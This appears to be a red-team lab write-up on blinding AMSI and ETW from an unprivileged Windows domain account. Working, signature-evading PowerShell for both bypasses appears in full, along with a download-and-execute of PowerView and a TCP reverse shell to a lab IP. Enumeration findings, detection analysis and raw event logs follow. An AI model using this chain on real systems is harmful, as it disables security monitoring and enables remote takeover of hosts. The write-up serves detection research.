# Vector 8 — AMSI/ETW Bypass from Unprivileged Context: Assumed Breach Without Admin

**Environment:** Windows Server 2019 (lab2019.local), Defender RTP enabled, AMSI enabled, ETW enabled, no exclusions.

**Access:** Domain user — no local admin, no DA, no privileged group membership. WinRM access via evil-winrm.

---

## The Assumption Being Tested

AMSI and ETW bypass via reflection is commonly demonstrated from administrative or SYSTEM contexts. The operational assumption is that a lowpriv user cannot meaningfully interfere with these controls. This test challenges that assumption.

---

## Finding

Both ETW and AMSI operate within the PowerShell process memory space. Reflection-based patching does not require elevation — it requires access to the current process's loaded assemblies, which any authenticated user has. The privilege boundary is irrelevant to the patch mechanism.

---

## ETW Patch

Submitted as a single block — no AMSI signature match on pure reflection against `PSEtwLogProvider`:

```powershell
$assembly = [System.AppDomain]::CurrentDomain.GetAssemblies() | Where-Object { $_.FullName -like '*System.Management.Automation*' }
$type = $assembly.GetType('System.Management.Automation.Tracing.PSEtwLogProvider')
$field = $type.GetField('etwProvider', [System.Reflection.BindingFlags]'NonPublic,Static')
$providerObject = $field.GetValue($null)
$iflags = [System.Reflection.BindingFlags]'NonPublic,Instance'
$handleField = $providerObject.GetType().GetField('m_regHandle', $iflags)
$handleField.SetValue($providerObject, [Int64]0)
```

Result: `m_regHandle` zeroed. ETW provider handle invalid. EID 4104 scriptblock logging stops for the session.

---

## AMSI Bypass

Defender signatures match on `AmsiUtils` and `amsiInitFailed` as substrings — including across naive string concatenation (`'Am'+'si'+'Utils'` still fires). Char-array construction bypasses this entirely because no string literal resembling the target ever exists in the token stream.

Submitted one line at a time due to evil-winrm's IEX transport wrapping each submission:

```powershell
$x = [System.Reflection.BindingFlags]'NonPublic,Static'
$c = 'System.Management.Automation.'
$d = [string]::Join('', [char[]](65,109,115,105,85,116,105,108,115))
$a = [string]::Join('', [char[]](97,109,115,105,73,110,105,116,70,97,105,108,101,100))
$f = [Ref].Assembly.GetType($c+$d)
$g = $f.GetField($a, $x)
$g.SetValue($null, $true)
```

`$d` = `AmsiUtils`, `$a` = `amsiInitFailed` — constructed at runtime from integer arrays, never present as string literals. `$x` must be cast as `[System.Reflection.BindingFlags]` — passing a plain string returns null from `GetField`.

---

## PowerView Load + Reverse Shell

With AMSI dead, PowerView loads clean over HTTP. The reverse shell inherits the patched runtime — AMSI and ETW remain disabled for all commands executed through the shell:

```powershell
IEX (New-Object Net.WebClient).DownloadString('http://192.168.1.218:8080/PowerView.ps1')
$client = New-Object Net.Sockets.TCPClient('192.168.1.218',4445)
$stream = $client.GetStream()
[byte[]]$bytes = 0..65535|%{0}
while(($i = $stream.Read($bytes,0,$bytes.Length)) -ne 0){
    $data = (New-Object Text.ASCIIEncoding).GetString($bytes,0,$i)
    $sendback = (Invoke-Expression $data 2>&1 | Out-String)
    $sendback2 = $sendback + 'PS> '
    $sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2)
    $stream.Write($sendbyte,0,$sendbyte.Length)
    $stream.Flush()
}
```

---

## Why Char-Array Works

Defender's AMSI signatures operate on the string content of scriptblocks as presented to the AMSI scan buffer. String concatenation (`'Am'+'si'`) is partially evaluated before scanning in some contexts, which is why naive splits still fire. Char-array construction via `[string]::Join('', [char[]](…))` is evaluated at runtime after the scan — the scan buffer sees only the Join call and integer arrays, never the assembled string. The signature has nothing to match against.

This is not a new technique. It is a demonstration that Defender's current signature set does not cover this construction pattern for `AmsiUtils`/`amsiInitFailed` as of May 2026.

---

## Detection Surface

ETW is the primary scriptblock logging mechanism. Once `m_regHandle` is zeroed, EID 4104 stops firing for all subsequent commands in the session. The only remaining telemetry is:

- **Network:** HTTP GET for PowerView payload, TCP connect to C2 port
- **Process:** `powershell.exe` spawned via WinRM (`wsmprovhost.exe` parent)
- **Authentication:** EID 4624 logon type 3 (WinRM) prior to bypass

**This detection outlives the technique:** the WinRM logon and parent process chain are logged before any bypass executes. A detection rule on `wsmprovhost.exe → powershell.exe` with subsequent outbound TCP is bypass-agnostic.

---

## Control Surface Assessment

| Control | Status | Notes |
|---|---|---|
| AMSI | Bypassed | Char-array construction evades signature |
| ETW / EID 4104 | Bypassed | `m_regHandle` zeroed in-process |
| Defender RTP | Did not prevent | No PE drop, no shellcode |
| Privilege requirement | None | Reflection operates on current process |
| WinRM logon telemetry | Intact | Pre-bypass, bypass-agnostic |

---

## Operational Implication

The privilege boundary does not protect AMSI or ETW. Any domain user with WinRM access can execute this chain. The realistic assumed-breach posture should treat AMSI and ETW as degraded once an attacker has interactive PowerShell — regardless of privilege level.

---

*Lab: Windows Server 2019, Defender signature build 1.1.24020.x, May 2026*

---

## Enumeration Output — Confirmed from Lowpriv Shell

All commands executed from nc reverse shell as `lab2019\lowpriv`. Defender RTP confirmed enabled prior to session. No commands blocked.

### Kerberoastable Accounts

```
samaccountname  serviceprincipalname
--------------  --------------------
krbtgt          kadmin/changepw
bob.harris      MSSQLSvc/fake.lab2019.local:1433
```

`bob.harris` is roastable. `msds-supportedencryptiontypes` = 16 (AES256 only — RC4 disabled domain-wide).

### ASREPRoastable Accounts

None. All accounts have Kerberos pre-authentication required.

### Unconstrained Delegation

```
dnshostname
-----------
WIN-JOCP945SK51.lab2019.local
```

DC only — expected, not exploitable from lowpriv without a coercion primitive.

### DCSync ACL

Only expected principals hold replication rights:

| SecurityIdentifier | Right |
|---|---|
| `-498` (Enterprise RODCs) | DS-Replication-Get-Changes |
| `-516` (Domain Controllers) | DS-Replication-Get-Changes-All |
| `S-1-5-32-544` (Administrators) | All replication rights |
| `S-1-5-9` (Enterprise DCs) | All replication rights |

No rogue DCSync delegation. Clean.

### ELK Telemetry — What Survived the Bypass

**Pre-execution telemetry (intact):**

| Event | Detail |
|---|---|
| EID 4776 | Credential validation — lowpriv, NTLM, source `192.168.1.218`. Fires before any code executes. Earliest indicator. |
| EID 4624 | Logon type 3, NTLM V2, null Kerberos GUID (confirms NTLM not Kerberos). WinRM session anchor. |

**Post-bypass silence (absent):**
- No EID 4104 scriptblock logging after `m_regHandle=0`
- No Defender alert for AMSI bypass, PowerView IEX load, or reverse shell

**The attribution gap:**
EID 4662 burst (PowerView LDAP enumeration) attributed to `WIN-JOCP945SK51$` machine account, not lowpriv. Without session correlation it is indistinguishable from normal DC self-enumeration.

**Bypass-agnostic detection pattern:**
```
4776 (lowpriv, NTLM, 192.168.1.218)
→ 4624 (logon type 3)
→ 4662 burst
→ 4104 absent
```

The gap where 4104 should be is the signal. A detection rule correlating `4624 type 3 from non-admin source + subsequent 4662 volume + no 4104 within session window` catches this regardless of which bypass technique was used.

### Additional Findings

- `MachineAccountQuota` = 10 — RBCD attack viable if GenericWrite target identified
- `alice.walker` (SID `-1601`) holds `GenericWrite` on `bob.harris` — targeted Kerberoast or shadow credentials path if alice.walker is compromised
- `S-1-5-32-548` (Account Operators) holds `GenericAll` on all computers in `CN=Computers` — escalation path if Account Operators membership obtained
- AdminSDHolder ACL clean — no non-standard principals





















ELK:


"'@timestamp"	"_id"	"_ignored"	"_index"	"_score"	"agent.ephemeral_id"	"agent.hostname"	"agent.id"	"agent.name"	"agent.type"	"agent.version"	"ecs.version"	"event.action"	"event.code"	"event.created"	"event.kind"	"event.outcome"	"event.provider"	"host.name"	"log.level"	message	"winlog.api"	"winlog.channel"	"winlog.computer_name"	"winlog.event_data.AccessList"	"winlog.event_data.AccessMask"	"winlog.event_data.AdditionalInfo"	"winlog.event_data.AuthenticationPackageName"	"winlog.event_data.Binary"	"winlog.event_data.CommandLine"	"winlog.event_data.Company"	"winlog.event_data.CurrentDirectory"	"winlog.event_data.Description"	"winlog.event_data.ElevatedToken"	"winlog.event_data.FileVersion"	"winlog.event_data.HandleId"	"winlog.event_data.Hashes"	"winlog.event_data.Image"	"winlog.event_data.ImpersonationLevel"	"winlog.event_data.IntegrityLevel"	"winlog.event_data.IpAddress"	"winlog.event_data.IpPort"	"winlog.event_data.KeyLength"	"winlog.event_data.LmPackageName"	"winlog.event_data.LogonGuid"	"winlog.event_data.LogonId"	"winlog.event_data.LogonProcessName"	"winlog.event_data.LogonType"	"winlog.event_data.ObjectName"	"winlog.event_data.ObjectServer"	"winlog.event_data.ObjectType"	"winlog.event_data.OperationType"	"winlog.event_data.OriginalFileName"	"winlog.event_data.PackageName"	"winlog.event_data.ParentCommandLine"	"winlog.event_data.ParentImage"	"winlog.event_data.ParentProcessGuid"	"winlog.event_data.ParentProcessId"	"winlog.event_data.ParentUser"	"winlog.event_data.ProcessGuid"	"winlog.event_data.ProcessId"	"winlog.event_data.ProcessName"	"winlog.event_data.Product"	"winlog.event_data.Properties"	"winlog.event_data.RestrictedAdminMode"	"winlog.event_data.RuleName"	"winlog.event_data.Status"	"winlog.event_data.SubjectDomainName"	"winlog.event_data.SubjectLogonId"	"winlog.event_data.SubjectUserName"	"winlog.event_data.SubjectUserSid"	"winlog.event_data.TargetDomainName"	"winlog.event_data.TargetLinkedLogonId"	"winlog.event_data.TargetLogonId"	"winlog.event_data.TargetOutboundDomainName"	"winlog.event_data.TargetOutboundUserName"	"winlog.event_data.TargetUserName"	"winlog.event_data.TargetUserSid"	"winlog.event_data.TerminalSessionId"	"winlog.event_data.TransmittedServices"	"winlog.event_data.User"	"winlog.event_data.UtcTime"	"winlog.event_data.VirtualAccount"	"winlog.event_data.WorkstationName"	"winlog.event_data.param1"	"winlog.event_data.param2"	"winlog.event_id"	"winlog.keywords"	"winlog.opcode"	"winlog.process.pid"	"winlog.process.thread.id"	"winlog.provider_guid"	"winlog.provider_name"	"winlog.record_id"	"winlog.task"	"winlog.user.domain"	"winlog.user.identifier"	"winlog.user.name"	"winlog.user.type"	"winlog.version"
"May 28, 2026 @ 21:03:49.769"	"zxDBb54ByrYY_kgLyu7P"	" - "	".ds-winlogbeat-8.19.14-2026.05.13-000002"	"'-"	"8a008e94-7973-4408-86f6-e55f4203034c"	"WIN-JOCP945SK51"	"aecf2b7e-1c30-46b5-b3f8-cbbfea77b7a6"	"WIN-JOCP945SK51"	winlogbeat	"8.19.14"	"8.0.0"	Logon	4624	"May 28, 2026 @ 21:03:51.047"	event	success	"Microsoft-Windows-Security-Auditing"	"WIN-JOCP945SK51.lab2019.local"	information	"An account was successfully logged on.

Subject:
	Security ID:		S-1-0-0
	Account Name:		-
	Account Domain:		-
	Logon ID:		0x0

Logon Information:
	Logon Type:		3
	Restricted Admin Mode:	-
	Virtual Account:		No
	Elevated Token:		Yes

Impersonation Level:		Impersonation

New Logon:
	Security ID:		S-1-5-18
	Account Name:		WIN-JOCP945SK51$
	Account Domain:		LAB2019.LOCAL
	Logon ID:		0x64A946
	Linked Logon ID:		0x0
	Network Account Name:	-
	Network Account Domain:	-
	Logon GUID:		{be51111d-d37b-ce63-1a45-615fd7354225}

Process Information:
	Process ID:		0x0
	Process Name:		-

Network Information:
	Workstation Name:	-
	Source Network Address:	127.0.0.1
	Source Port:		50497

Detailed Authentication Information:
	Logon Process:		Kerberos
	Authentication Package:	Kerberos
	Transited Services:	-
	Package Name (NTLM only):	-
	Key Length:		0

This event is generated when a logon session is created. It is generated on the computer that was accessed.

The subject fields indicate the account on the local system which requested the logon. This is most commonly a service such as the Server service, or a local process such as Winlogon.exe or Services.exe.

The logon type field indicates the kind of logon that occurred. The most common types are 2 (interactive) and 3 (network).

The New Logon fields indicate the account for whom the new logon was created, i.e. the account that was logged on.

The network fields indicate where a remote logon request originated. Workstation name is not always available and may be left blank in some cases.

The impersonation level field indicates the extent to which a process in the logon session can impersonate.

The authentication information fields provide detailed information about this specific logon request.
	- Logon GUID is a unique identifier that can be used to correlate this event with a KDC event.
	- Transited services indicate which intermediate services have participated in this logon request.
	- Package name indicates which sub-protocol was used among the NTLM protocols.
	- Key length indicates the length of the generated session key. This will be 0 if no session key was requested."	wineventlog	Security	"WIN-JOCP945SK51.lab2019.local"	" - "	" - "	" - "	Kerberos	" - "	" - "	" - "	" - "	" - "	"%%1842"	" - "	" - "	" - "	" - "	"%%1833"	" - "	"127.0.0.1"	50497	0	"'-"	"{be51111d-d37b-ce63-1a45-615fd7354225}"	" - "	Kerberos	3	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	0x0	"'-"	" - "	" - "	"'-"	" - "	" - "	"'-"	0x0	"'-"	"S-1-0-0"	"LAB2019.LOCAL"	0x0	0x64a946	"'-"	"'-"	"WIN-JOCP945SK51$"	"S-1-5-18"	" - "	"'-"	" - "	" - "	"%%1843"	"'-"	" - "	" - "	4624	"Audit Success"	Info	644	"3,876"	"{54849625-5478-4994-a5ba-3e3b0328c30d}"	"Microsoft-Windows-Security-Auditing"	1110290	Logon	" - "	" - "	" - "	" - "	2
"May 28, 2026 @ 21:03:40.360"	"zhDBb54ByrYY_kgLyu7P"	" - "	".ds-winlogbeat-8.19.14-2026.05.13-000002"	"'-"	"8a008e94-7973-4408-86f6-e55f4203034c"	"WIN-JOCP945SK51"	"aecf2b7e-1c30-46b5-b3f8-cbbfea77b7a6"	"WIN-JOCP945SK51"	winlogbeat	"8.19.14"	"8.0.0"	Logon	4624	"May 28, 2026 @ 21:03:42.041"	event	success	"Microsoft-Windows-Security-Auditing"	"WIN-JOCP945SK51.lab2019.local"	information	"An account was successfully logged on.

Subject:
	Security ID:		S-1-0-0
	Account Name:		-
	Account Domain:		-
	Logon ID:		0x0

Logon Information:
	Logon Type:		3
	Restricted Admin Mode:	-
	Virtual Account:		No
	Elevated Token:		Yes

Impersonation Level:		Impersonation

New Logon:
	Security ID:		S-1-5-21-3984567624-304424726-3877085034-1103
	Account Name:		lowpriv
	Account Domain:		LAB2019
	Logon ID:		0x64A7E7
	Linked Logon ID:		0x0
	Network Account Name:	-
	Network Account Domain:	-
	Logon GUID:		{00000000-0000-0000-0000-000000000000}

Process Information:
	Process ID:		0x0
	Process Name:		-

Network Information:
	Workstation Name:	-
	Source Network Address:	192.168.1.218
	Source Port:		59262

Detailed Authentication Information:
	Logon Process:		NtLmSsp 
	Authentication Package:	NTLM
	Transited Services:	-
	Package Name (NTLM only):	NTLM V2
	Key Length:		128

This event is generated when a logon session is created. It is generated on the computer that was accessed.

The subject fields indicate the account on the local system which requested the logon. This is most commonly a service such as the Server service, or a local process such as Winlogon.exe or Services.exe.

The logon type field indicates the kind of logon that occurred. The most common types are 2 (interactive) and 3 (network).

The New Logon fields indicate the account for whom the new logon was created, i.e. the account that was logged on.

The network fields indicate where a remote logon request originated. Workstation name is not always available and may be left blank in some cases.

The impersonation level field indicates the extent to which a process in the logon session can impersonate.

The authentication information fields provide detailed information about this specific logon request.
	- Logon GUID is a unique identifier that can be used to correlate this event with a KDC event.
	- Transited services indicate which intermediate services have participated in this logon request.
	- Package name indicates which sub-protocol was used among the NTLM protocols.
	- Key length indicates the length of the generated session key. This will be 0 if no session key was requested."	wineventlog	Security	"WIN-JOCP945SK51.lab2019.local"	" - "	" - "	" - "	NTLM	" - "	" - "	" - "	" - "	" - "	"%%1842"	" - "	" - "	" - "	" - "	"%%1833"	" - "	"192.168.1.218"	59262	128	"NTLM V2"	"{00000000-0000-0000-0000-000000000000}"	" - "	"NtLmSsp "	3	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	0x0	"'-"	" - "	" - "	"'-"	" - "	" - "	"'-"	0x0	"'-"	"S-1-0-0"	LAB2019	0x0	0x64a7e7	"'-"	"'-"	lowpriv	"S-1-5-21-3984567624-304424726-3877085034-1103"	" - "	"'-"	" - "	" - "	"%%1843"	"'-"	" - "	" - "	4624	"Audit Success"	Info	644	"4,076"	"{54849625-5478-4994-a5ba-3e3b0328c30d}"	"Microsoft-Windows-Security-Auditing"	1110283	Logon	" - "	" - "	" - "	" - "	2
"May 28, 2026 @ 21:03:40.360"	"zRDBb54ByrYY_kgLyu7P"	" - "	".ds-winlogbeat-8.19.14-2026.05.13-000002"	"'-"	"8a008e94-7973-4408-86f6-e55f4203034c"	"WIN-JOCP945SK51"	"aecf2b7e-1c30-46b5-b3f8-cbbfea77b7a6"	"WIN-JOCP945SK51"	winlogbeat	"8.19.14"	"8.0.0"	"Credential Validation"	4776	"May 28, 2026 @ 21:03:42.041"	event	success	"Microsoft-Windows-Security-Auditing"	"WIN-JOCP945SK51.lab2019.local"	information	"The computer attempted to validate the credentials for an account.

Authentication Package:	MICROSOFT_AUTHENTICATION_PACKAGE_V1_0
Logon Account:	lowpriv
Source Workstation:	
Error Code:	0x0"	wineventlog	Security	"WIN-JOCP945SK51.lab2019.local"	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	"MICROSOFT_AUTHENTICATION_PACKAGE_V1_0"	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	0x0	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	lowpriv	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	4776	"Audit Success"	Info	644	"4,076"	"{54849625-5478-4994-a5ba-3e3b0328c30d}"	"Microsoft-Windows-Security-Auditing"	1110282	"Credential Validation"	" - "	" - "	" - "	" - "	-
"May 28, 2026 @ 21:03:15.326"	"zBDBb54ByrYY_kgLWe47"	" - "	".ds-winlogbeat-8.19.14-2026.05.13-000002"	"'-"	"8a008e94-7973-4408-86f6-e55f4203034c"	"WIN-JOCP945SK51"	"aecf2b7e-1c30-46b5-b3f8-cbbfea77b7a6"	"WIN-JOCP945SK51"	winlogbeat	"8.19.14"	"8.0.0"	"Directory Service Access"	4662	"May 28, 2026 @ 21:03:17.026"	event	success	"Microsoft-Windows-Security-Auditing"	"WIN-JOCP945SK51.lab2019.local"	information	"An operation was performed on an object.

Subject :
	Security ID:		S-1-5-18
	Account Name:		WIN-JOCP945SK51$
	Account Domain:		LAB2019
	Logon ID:		0xCBDEC

Object:
	Object Server:		DS
	Object Type:		%{7b35dbad-b3ec-486a-aad4-2fec9d6ea6f6}
	Object Name:		%{2a7d2632-b837-40c8-b0bc-b4b91617be0b}
	Handle ID:		0x0

Operation:
	Operation Type:		Object Access
	Accesses:		Read Property
				
	Access Mask:		0x10
	Properties:		Read Property
		{e48d0154-bcf8-11d1-8702-00c04fb96050}
			{bf96793f-0de6-11d0-a285-00aa003049e2}
			{bf9679e4-0de6-11d0-a285-00aa003049e2}
			{bf9679e7-0de6-11d0-a285-00aa003049e2}
		{771727b1-31b8-4cdf-ae62-4fe39fadf89e}
			{bf967a6f-0de6-11d0-a285-00aa003049e2}
			{fe515695-3f61-45c8-9bfa-19c148c57b09}
	{7b35dbad-b3ec-486a-aad4-2fec9d6ea6f6}


Additional Information:
	Parameter 1:		-
	Parameter 2:		"	wineventlog	Security	"WIN-JOCP945SK51.lab2019.local"	"%%7684
				"	0x10	"'-"	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	0x0	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	"%{2a7d2632-b837-40c8-b0bc-b4b91617be0b}"	DS	"%{7b35dbad-b3ec-486a-aad4-2fec9d6ea6f6}"	"Object Access"	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	"%%7684
		{e48d0154-bcf8-11d1-8702-00c04fb96050}
			{bf96793f-0de6-11d0-a285-00aa003049e2}
			{bf9679e4-0de6-11d0-a285-00aa003049e2}
			{bf9679e7-0de6-11d0-a285-00aa003049e2}
		{771727b1-31b8-4cdf-ae62-4fe39fadf89e}
			{bf967a6f-0de6-11d0-a285-00aa003049e2}
			{fe515695-3f61-45c8-9bfa-19c148c57b09}
	{7b35dbad-b3ec-486a-aad4-2fec9d6ea6f6}"	" - "	" - "	" - "	LAB2019	0xcbdec	"WIN-JOCP945SK51$"	"S-1-5-18"	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	4662	"Audit Success"	Info	644	768	"{54849625-5478-4994-a5ba-3e3b0328c30d}"	"Microsoft-Windows-Security-Auditing"	1110266	"Directory Service Access"	" - "	" - "	" - "	" - "	-
"May 28, 2026 @ 21:03:15.326"	"yxDBb54ByrYY_kgLWe47"	" - "	".ds-winlogbeat-8.19.14-2026.05.13-000002"	"'-"	"8a008e94-7973-4408-86f6-e55f4203034c"	"WIN-JOCP945SK51"	"aecf2b7e-1c30-46b5-b3f8-cbbfea77b7a6"	"WIN-JOCP945SK51"	winlogbeat	"8.19.14"	"8.0.0"	"Directory Service Access"	4662	"May 28, 2026 @ 21:03:17.026"	event	success	"Microsoft-Windows-Security-Auditing"	"WIN-JOCP945SK51.lab2019.local"	information	"An operation was performed on an object.

Subject :
	Security ID:		S-1-5-18
	Account Name:		WIN-JOCP945SK51$
	Account Domain:		LAB2019
	Logon ID:		0xCBDEC

Object:
	Object Server:		DS
	Object Type:		%{bf967a8b-0de6-11d0-a285-00aa003049e2}
	Object Name:		%{136b2f78-f565-44e5-94fa-df669a4fa178}
	Handle ID:		0x0

Operation:
	Operation Type:		Object Access
	Accesses:		List Contents
				
	Access Mask:		0x4
	Properties:		List Contents
	{bf967a8b-0de6-11d0-a285-00aa003049e2}


Additional Information:
	Parameter 1:		-
	Parameter 2:		"	wineventlog	Security	"WIN-JOCP945SK51.lab2019.local"	"%%7682
				"	0x4	"'-"	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	0x0	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	"%{136b2f78-f565-44e5-94fa-df669a4fa178}"	DS	"%{bf967a8b-0de6-11d0-a285-00aa003049e2}"	"Object Access"	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	"%%7682
	{bf967a8b-0de6-11d0-a285-00aa003049e2}"	" - "	" - "	" - "	LAB2019	0xcbdec	"WIN-JOCP945SK51$"	"S-1-5-18"	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	4662	"Audit Success"	Info	644	768	"{54849625-5478-4994-a5ba-3e3b0328c30d}"	"Microsoft-Windows-Security-Auditing"	1110265	"Directory Service Access"	" - "	" - "	" - "	" - "	-
"May 28, 2026 @ 21:03:15.326"	"yhDBb54ByrYY_kgLWe47"	" - "	".ds-winlogbeat-8.19.14-2026.05.13-000002"	"'-"	"8a008e94-7973-4408-86f6-e55f4203034c"	"WIN-JOCP945SK51"	"aecf2b7e-1c30-46b5-b3f8-cbbfea77b7a6"	"WIN-JOCP945SK51"	winlogbeat	"8.19.14"	"8.0.0"	"Directory Service Access"	4662	"May 28, 2026 @ 21:03:17.026"	event	success	"Microsoft-Windows-Security-Auditing"	"WIN-JOCP945SK51.lab2019.local"	information	"An operation was performed on an object.

Subject :
	Security ID:		S-1-5-18
	Account Name:		WIN-JOCP945SK51$
	Account Domain:		LAB2019
	Logon ID:		0xCBDEC

Object:
	Object Server:		DS
	Object Type:		%{7b35dbad-b3ec-486a-aad4-2fec9d6ea6f6}
	Object Name:		%{2a7d2632-b837-40c8-b0bc-b4b91617be0b}
	Handle ID:		0x0

Operation:
	Operation Type:		Object Access
	Accesses:		Read Property
				
	Access Mask:		0x10
	Properties:		Read Property
		{e48d0154-bcf8-11d1-8702-00c04fb96050}
			{26d97369-6070-11d1-a9c6-0000f80367c1}
	{7b35dbad-b3ec-486a-aad4-2fec9d6ea6f6}


Additional Information:
	Parameter 1:		-
	Parameter 2:		"	wineventlog	Security	"WIN-JOCP945SK51.lab2019.local"	"%%7684
				"	0x10	"'-"	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	0x0	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	"%{2a7d2632-b837-40c8-b0bc-b4b91617be0b}"	DS	"%{7b35dbad-b3ec-486a-aad4-2fec9d6ea6f6}"	"Object Access"	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	"%%7684
		{e48d0154-bcf8-11d1-8702-00c04fb96050}
			{26d97369-6070-11d1-a9c6-0000f80367c1}
	{7b35dbad-b3ec-486a-aad4-2fec9d6ea6f6}"	" - "	" - "	" - "	LAB2019	0xcbdec	"WIN-JOCP945SK51$"	"S-1-5-18"	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	4662	"Audit Success"	Info	644	768	"{54849625-5478-4994-a5ba-3e3b0328c30d}"	"Microsoft-Windows-Security-Auditing"	1110264	"Directory Service Access"	" - "	" - "	" - "	" - "	-
"May 28, 2026 @ 21:03:15.325"	"yRDBb54ByrYY_kgLWe47"	" - "	".ds-winlogbeat-8.19.14-2026.05.13-000002"	"'-"	"8a008e94-7973-4408-86f6-e55f4203034c"	"WIN-JOCP945SK51"	"aecf2b7e-1c30-46b5-b3f8-cbbfea77b7a6"	"WIN-JOCP945SK51"	winlogbeat	"8.19.14"	"8.0.0"	"Directory Service Access"	4662	"May 28, 2026 @ 21:03:17.026"	event	success	"Microsoft-Windows-Security-Auditing"	"WIN-JOCP945SK51.lab2019.local"	information	"An operation was performed on an object.

Subject :
	Security ID:		S-1-5-18
	Account Name:		WIN-JOCP945SK51$
	Account Domain:		LAB2019
	Logon ID:		0xCBDEC

Object:
	Object Server:		DS
	Object Type:		%{19195a5b-6da0-11d0-afd3-00c04fd930c9}
	Object Name:		%{a585c3e8-301b-455d-acb6-9de420bfc732}
	Handle ID:		0x0

Operation:
	Operation Type:		Object Access
	Accesses:		Read Property
				
	Access Mask:		0x10
	Properties:		Read Property
		{e48d0154-bcf8-11d1-8702-00c04fb96050}
			{bf9679e7-0de6-11d0-a285-00aa003049e2}
		{771727b1-31b8-4cdf-ae62-4fe39fadf89e}
			{d31a8757-2447-4545-8081-3bb610cacbf2}
	{19195a5b-6da0-11d0-afd3-00c04fd930c9}


Additional Information:
	Parameter 1:		-
	Parameter 2:		"	wineventlog	Security	"WIN-JOCP945SK51.lab2019.local"	"%%7684
				"	0x10	"'-"	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	0x0	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	"%{a585c3e8-301b-455d-acb6-9de420bfc732}"	DS	"%{19195a5b-6da0-11d0-afd3-00c04fd930c9}"	"Object Access"	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	"%%7684
		{e48d0154-bcf8-11d1-8702-00c04fb96050}
			{bf9679e7-0de6-11d0-a285-00aa003049e2}
		{771727b1-31b8-4cdf-ae62-4fe39fadf89e}
			{d31a8757-2447-4545-8081-3bb610cacbf2}
	{19195a5b-6da0-11d0-afd3-00c04fd930c9}"	" - "	" - "	" - "	LAB2019	0xcbdec	"WIN-JOCP945SK51$"	"S-1-5-18"	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	4662	"Audit Success"	Info	644	768	"{54849625-5478-4994-a5ba-3e3b0328c30d}"	"Microsoft-Windows-Security-Auditing"	1110259	"Directory Service Access"	" - "	" - "	" - "	" - "	-
"May 28, 2026 @ 21:03:15.325"	"yBDBb54ByrYY_kgLWe47"	" - "	".ds-winlogbeat-8.19.14-2026.05.13-000002"	"'-"	"8a008e94-7973-4408-86f6-e55f4203034c"	"WIN-JOCP945SK51"	"aecf2b7e-1c30-46b5-b3f8-cbbfea77b7a6"	"WIN-JOCP945SK51"	winlogbeat	"8.19.14"	"8.0.0"	"Directory Service Access"	4662	"May 28, 2026 @ 21:03:17.026"	event	success	"Microsoft-Windows-Security-Auditing"	"WIN-JOCP945SK51.lab2019.local"	information	"An operation was performed on an object.

Subject :
	Security ID:		S-1-5-18
	Account Name:		WIN-JOCP945SK51$
	Account Domain:		LAB2019
	Logon ID:		0xCBDEC

Object:
	Object Server:		DS
	Object Type:		%{19195a5b-6da0-11d0-afd3-00c04fd930c9}
	Object Name:		%{a585c3e8-301b-455d-acb6-9de420bfc732}
	Handle ID:		0x0

Operation:
	Operation Type:		Object Access
	Accesses:		Read Property
				
	Access Mask:		0x10
	Properties:		Read Property
		{e48d0154-bcf8-11d1-8702-00c04fb96050}
			{26d97369-6070-11d1-a9c6-0000f80367c1}
	{19195a5b-6da0-11d0-afd3-00c04fd930c9}


Additional Information:
	Parameter 1:		-
	Parameter 2:		"	wineventlog	Security	"WIN-JOCP945SK51.lab2019.local"	"%%7684
				"	0x10	"'-"	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	0x0	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	"%{a585c3e8-301b-455d-acb6-9de420bfc732}"	DS	"%{19195a5b-6da0-11d0-afd3-00c04fd930c9}"	"Object Access"	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	"%%7684
		{e48d0154-bcf8-11d1-8702-00c04fb96050}
			{26d97369-6070-11d1-a9c6-0000f80367c1}
	{19195a5b-6da0-11d0-afd3-00c04fd930c9}"	" - "	" - "	" - "	LAB2019	0xcbdec	"WIN-JOCP945SK51$"	"S-1-5-18"	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	4662	"Audit Success"	Info	644	768	"{54849625-5478-4994-a5ba-3e3b0328c30d}"	"Microsoft-Windows-Security-Auditing"	1110258	"Directory Service Access"	" - "	" - "	" - "	" - "	-
